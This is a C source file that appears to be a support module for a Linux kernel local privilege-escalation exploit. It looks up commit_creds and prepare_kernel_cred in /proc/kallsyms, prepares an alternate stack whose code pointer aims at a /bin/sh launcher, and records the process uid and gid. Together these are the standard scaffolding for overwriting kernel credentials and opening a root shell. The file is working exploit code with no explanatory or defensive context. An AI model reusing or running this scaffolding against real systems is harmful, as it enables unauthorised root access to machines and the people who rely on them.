#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/syscall.h>
#include <sched.h>
#include <sys/mman.h>
#include <string.h>
#include "kernel_header.h"

/* arch dependent data/code */

#ifdef __x86_64__

unsigned long __rdtsc()
{
  unsigned long __tsc;
  asm volatile(
                "pushq %%rax\t\n"
                "pushq %%rdx\t\n"
                "xorq %%rdx, %%rdx\t\n"
                "xorq %%rax, %%rax\t\n"
                "rdtsc\t\n"
                "shlq  $32, %%rdx\t\n"
                "orq %%rdx, %%rax\t\n"
                "movq %%rax, %0\t\n"
                "popq %%rdx\t\n"
                "popq %%rax\t\n"
                : "=r"(__tsc) : : "rdx", "rax"
              );
  return __tsc;
}


#endif


unsigned long get_sym_kallsyms(const char* symstr)
{
  FILE* stream;
  char fbuf[256];
  char addr[32];

  stream = fopen("/proc/kallsyms", "r");
  if (stream == NULL)
    __fatal_errno("open: kallsyms");

  memset(fbuf, 0x00, sizeof(fbuf));
  while(fgets(fbuf, 256, stream) > 0)
  {
    char *p = fbuf;
    char *a = addr;
    memset(addr, 0x00, sizeof(addr));
    fbuf[strlen(fbuf)-1] = 0;
    while(*p != ' ')
      *a++ = *p++;
    p += 3;
    if(!strcmp(p, symstr))
      return strtoul(addr, NULL, 16);
  }

  return 0;
}


/* arch independent data/code */

void user_mode_set_env()
{
  user_mode_set_segment();
  memset(stack, 0x00, sizeof(stack));
  _alternate_stack = (unsigned long)stack;
  _alternate_code = (unsigned long)shell_exec;
  _process_uid = getuid();
  _process_gid = getgid();
  _page_size   = sysconf(_SC_PAGESIZE);
  commit_creds = (void*)get_sym_kallsyms("commit_creds");
  prepare_kernel_cred = (void*)get_sym_kallsyms("prepare_kernel_cred");

#ifdef __KERNEL_DEBUG
  __msg_f("[**] commit_cred=%p\n", commit_creds);
  __msg_f("[**] prepare_kernel_cred=%p\n", prepare_kernel_cred);
#endif
}

void shell_exec(void)
{
  char *argv[2] = {"/bin/sh", NULL};
  execve("/bin/sh", argv, NULL);
  printf("[!!] Execve failed!\n");
  exit(1);
}

int start_thread(int (*f)(void *), void *arg)
{
  char *stack = calloc(1, STACK_SIZE);
  int tid;
  if(stack == NULL)
    __fatal_errno("calloc");

  tid = clone(f, stack + STACK_SIZE - sizeof(unsigned long),
              CLONE_FS|CLONE_FILES|CLONE_SIGHAND|CLONE_VM, arg);

  if (tid < 0) {
    free(stack);
    __fatal_errno("clone");
  }
  return tid;
}


